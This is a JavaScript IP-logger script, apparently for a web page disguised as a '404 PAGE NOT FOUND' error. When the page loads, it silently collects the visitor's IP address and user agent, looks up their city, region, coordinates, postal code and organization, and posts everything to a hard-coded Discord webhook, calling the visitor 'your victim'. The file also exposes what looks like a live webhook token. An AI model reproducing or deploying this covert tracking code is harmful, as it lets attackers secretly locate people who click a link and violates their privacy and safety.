console.log('404 PAGE NOT FOUND ERROR')




const webhookurl = 'https://discord.com/api/webhooks/1193355336703283311/EmG8d_EJCuviKmN5hasvQVlaSsW-SEH2g9lUssutKzgHBhFlAGhK8vfGawT9RsekZERs'

// Sets current time to a variable

const currentDate = new Date()

const hours = currentDate.getHours();
const minutes = currentDate.getMinutes();
const seconds = currentDate.getSeconds();

const currentTime = `${hours}:${minutes}:${seconds}`;


// Fetches the ip data


fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const ip = data.ip;

    // gets the browsers user agent

    const browserdata = navigator.userAgent;

    // Gets the ip info

    fetch('https://ipapi.co/' + ip + '/json/')
      .then(response => response.json())
      .then(ip_info => {
       
        // Sets the data to be posted to the webhook

        const postData = {
          embeds: [{
            title: 'IP logger',
            description: 'Your victim clicked the link at | ' + currentTime,
            color: 16763904,
            fields: [
              {
                name: 'Ip address',
                value: '```' + ip + '```',
                inline: false
              },
              {
                name: 'User agent data',
                value: '```' + browserdata + '```',
                inline: false
              },
              {
                name: 'IP info',
                value: '```' + 'Ip: ' + ip_info.ip + '\n' + 'City: ' + ip_info.city + '\n' + 'Region: ' + ip_info.region + '|' + ip_info.region_code + '\n' + 'Country: ' + ip_info.country_name + '\n' + 'Lat + Long: ' + ip_info.latitude + ip_info.longitude + '\n' + 'Postal: ' + ip_info.postal + '\n' + 'Timezone: ' + ip_info.timezone + '\n' + 'Organization: ' + ip_info.org + '```',
                inline: false
              },
            ]
          }]
        };


        // Posts the data

        fetch(webhookurl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(postData)
        });
      })
  })

